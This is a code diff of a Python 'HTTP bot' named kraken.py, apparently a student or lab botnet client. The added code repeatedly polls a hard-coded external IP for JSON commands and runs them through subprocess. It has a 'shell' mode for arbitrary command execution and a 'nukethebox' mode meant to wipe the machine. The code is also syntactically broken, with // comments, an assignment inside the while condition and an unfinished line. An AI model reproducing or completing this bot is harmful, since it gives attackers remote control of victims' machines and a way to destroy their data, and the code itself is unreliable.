@@ -2,33 +2,21 @@
 // Amanda Brown (aeb6590) 
 // kraken.py (HTTP bot) 
 
-import socket
+import json
 import requests
 import subprocess
-import threading
 import time
 from random import * 
 
 PORT = 8080
-servStat = False
-
-// request to server to register
+EX = 0
 
 class Bot:
     def _init_(self,uuid):
         self.uuid = getUUID()
-
-    def connect():
-        // Create socket object 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        host = socket.gethostname() 
-        s.connect((host, PORT))
-        servStat = True
-        //continue 
-    
+ 
     def getUUID():
         uuid = random() 
-        // server should check if this is valid num
         return uuid
 
     def request():
@@ -44,23 +32,37 @@ class Bot:
     def response():
 
 
-t1 = threading.Thread(target = updater) 
-t2 = threading.Thread(target = function, args = ())
-
-def updater(): 
-    while (servStat): 
-        time.sleep(3)
-    // send update of hi i am alive
-    // but barely breathing
-    // and hes got time while shes got freeeeedom
-    // and when a heart breaks no it dont break even 
-    // even 
-    // ooooooh 
-
 b = Bot(random())
 
-def main_not_main(): 
-    // run the bots execution 
+# Execute a passed in shell command 
+def shellExec(command): 
+    subprocess.call(command)
 
+# Execute the passed in nuke command
+def nuke(command):
+    subprocess.call(command)
+
+# Figure the bot's sleep time
+def sleepTime(ret):
+    if ret == 200: 
+        sleepTime = 3
+    else: 
+        sleepTime = 
+
+# Execute the program
 def main():
-    // run the threads 
+    while (EX = 0):
+        cmd = requests.get('http://129.21.115.114:8080')
+        parsedCmd = json.loads(cmd)
+        
+        # If server replies with shell execution command
+        if parsedCmd.get("mode") == "shell":
+            resp = shellExec(parsedCmd.get("params"))
+        
+        # If server replies with nuke the box command 
+        if parsedCmd.get("mode") == "nukethebox": 
+            resp = nuke(parsedCmd.get("params"))
+
+        ret = requests.post('http://129.21.115.114:8080')
+
+        TTS = sleepTime(ret.status_code) 
